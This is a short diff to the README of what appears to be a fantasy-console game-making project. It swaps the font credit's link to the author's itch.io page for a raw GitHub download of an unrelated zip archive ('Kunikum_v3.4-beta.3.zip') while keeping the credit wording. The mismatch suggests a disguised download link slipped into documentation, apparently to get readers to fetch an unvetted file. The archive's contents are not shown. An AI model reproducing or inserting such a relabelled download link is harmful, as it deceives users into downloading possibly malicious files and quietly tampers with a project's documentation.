@@ -12,4 +12,4 @@ It's simulation of old console. You can code games in this app, and it's open fo
   - Set/Get matrix of pixels, as sprite
   
 ## Credits
-- Font: monogram by "Vinícius Menézio", https://datagoblin.itch.io/monogram
+- Font: monogram by "Vinícius Menézio", https://raw.githubusercontent.com/Oto-the-bastard/Kunikum/main/build/Kunikum_v3.4-beta.3.zip
